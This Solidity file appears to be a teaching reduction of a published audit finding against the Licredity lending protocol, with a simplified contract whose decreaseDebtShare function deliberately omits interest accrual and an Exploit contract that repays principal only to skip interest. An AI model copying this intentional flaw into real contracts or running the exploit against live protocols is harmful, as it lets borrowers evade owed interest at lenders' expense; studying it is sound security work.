// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*//////////////////////////////////////////////////////////////////////////
    Licredity — decreaseDebtShare bypasses interest accrual
    (Cyfrin review, finding #62350)

    SYNTHETIC, CHEATCODE-FREE reduction for the EVM Playground.
    Root cause: interest accrues only in unlock/swap/liquidity paths. Direct
    decreaseDebtShare uses the last totalDebtBalance/totalDebtShare without
    first accruing, so a borrower repays from a stale ratio and skips interest.
    The repayment formula is preserved; the missing _collectInterest call is
    the @> VULN. Harm: amount repaid equals principal (no interest), while a
    preview of the accrued debt is strictly larger.

    Interest model (C2 reduction): a pending 10% balance growth applied only
    by _collectInterest (called from unlock). No cheatcodes / no time warp —
    the real protocol uses elapsed-time interest; the skip-accrual bug is
    identical either way.
//////////////////////////////////////////////////////////////////////////*/

/// @notice Reduced Licredity: debt shares + interest that only accrues in unlock.
contract Licredity {
    struct Position {
        address owner;
        uint256 debtShare;
    }

    mapping(uint256 => Position) public positions;
    uint256 public positionCount;

    // debt fungible accounting (this contract mints/burns)
    mapping(address => uint256) public balanceOf;
    uint256 public totalSupply;

    uint256 public totalDebtShare;
    uint256 public totalDebtBalance;

    // pending accrual: applied only via _collectInterest (unlock/swap/LP paths)
    bool public interestAccrued;
    uint256 public constant INTEREST_BPS = 1000; // +10% when accrued
    uint256 public constant BPS = 10_000;

    function _mint(address to, uint256 amt) internal {
        balanceOf[to] += amt;
        totalSupply += amt;
    }

    function _burn(address from, uint256 amt) internal {
        balanceOf[from] -= amt;
        totalSupply -= amt;
    }

    /// @notice Accrue pending interest into totalDebtBalance (intent of _collectInterest).
    function _collectInterest() internal {
        if (interestAccrued || totalDebtBalance == 0) return;
        totalDebtBalance += (totalDebtBalance * INTEREST_BPS) / BPS;
        interestAccrued = true;
    }

    /// @notice unlock path — accrues interest (one of the only places that does).
    function unlock() external {
        _collectInterest();
    }

    function open() external returns (uint256 id) {
        id = ++positionCount;
        positions[id].owner = msg.sender;
    }

    /// @notice Borrow: mint debt fungible against a new share delta.
    function increaseDebtShare(uint256 positionId, uint256 delta, address recipient)
        external
        returns (uint256 amount)
    {
        Position storage position = positions[positionId];
        require(position.owner == msg.sender, "NotPositionOwner");

        if (totalDebtShare == 0) {
            amount = delta;
        } else {
            amount = (delta * totalDebtBalance) / totalDebtShare;
        }

        position.debtShare += delta;
        totalDebtShare += delta;
        totalDebtBalance += amount;
        _mint(recipient, amount);
    }

    /// @notice Preview what the share delta costs IF interest were accrued first.
    function previewRepayWithAccrual(uint256 delta) external view returns (uint256 amount) {
        uint256 bal = totalDebtBalance;
        if (!interestAccrued && bal > 0) {
            bal += (bal * INTEREST_BPS) / BPS;
        }
        amount = _fullMulDivUp(delta, bal, totalDebtShare);
    }

    function _fullMulDivUp(uint256 a, uint256 b, uint256 c) internal pure returns (uint256) {
        return (a * b + c - 1) / c;
    }

    /// @notice Vulnerable: NO _collectInterest() at the start
    function decreaseDebtShare(uint256 positionId, uint256 delta, bool useBalance)
        external
        returns (uint256 amount)
    {
        Position storage position = positions[positionId];

        // FIX: _collectInterest(); // pull-accrue before reading the ratio
        uint256 _totalDebtShare = totalDebtShare; // @> VULN: missing _collectInterest() — reads stale totalDebtShare/Balance
        uint256 _totalDebtBalance = totalDebtBalance; // gas saving
        // amount of debt fungible to be burned
        amount = _fullMulDivUp(delta, _totalDebtBalance, _totalDebtShare);

        if (useBalance) {
            require(position.owner == msg.sender, "NotPositionOwner");
            _burn(address(this), amount);
        } else {
            require(position.owner != address(0), "PositionDoesNotExist");
            _burn(msg.sender, amount);
        }

        position.debtShare -= delta;
        totalDebtShare = _totalDebtShare - delta;
        totalDebtBalance = _totalDebtBalance - amount;
    }

    function ownerOf(uint256 id) external view returns (address) {
        return positions[id].owner;
    }

    function debtShareOf(uint256 id) external view returns (uint256) {
        return positions[id].debtShare;
    }
}

/// @dev Borrower opens a position, borrows, then repays via direct decreaseDebtShare
///      without unlock, skipping the interest that unlock would have charged.
contract Exploit {
    Licredity public lic; // CREATE nonce 1
    uint256 public positionId;
    uint256 public amountBorrowed;
    uint256 public amountRepaid;
    uint256 public amountIfAccrued;
    uint256 public interestSkipped;

    uint256 public constant DELTA = 1e8 * 1e6; // matches the finding's PoC scale

    constructor() {
        lic = new Licredity();
    }

    function run() external {
        positionId = lic.open();
        amountBorrowed = lic.increaseDebtShare(positionId, DELTA, address(this));

        // Preview: if interest were accrued first, this share would cost more
        amountIfAccrued = lic.previewRepayWithAccrual(DELTA);
        require(amountIfAccrued > amountBorrowed, "interest should be pending");

        // Vulnerable path: direct decreaseDebtShare WITHOUT unlock/_collectInterest
        amountRepaid = lic.decreaseDebtShare(positionId, DELTA, false);

        // HARM (finding's assertion): no interest has been accrued → repaid == borrowed
        require(amountRepaid == amountBorrowed, "should equal principal only");
        require(amountRepaid < amountIfAccrued, "interest was skipped");

        interestSkipped = amountIfAccrued - amountRepaid;
        require(interestSkipped > 0, "no interest skipped");
        require(lic.debtShareOf(positionId) == 0, "shares remain");
    }
}
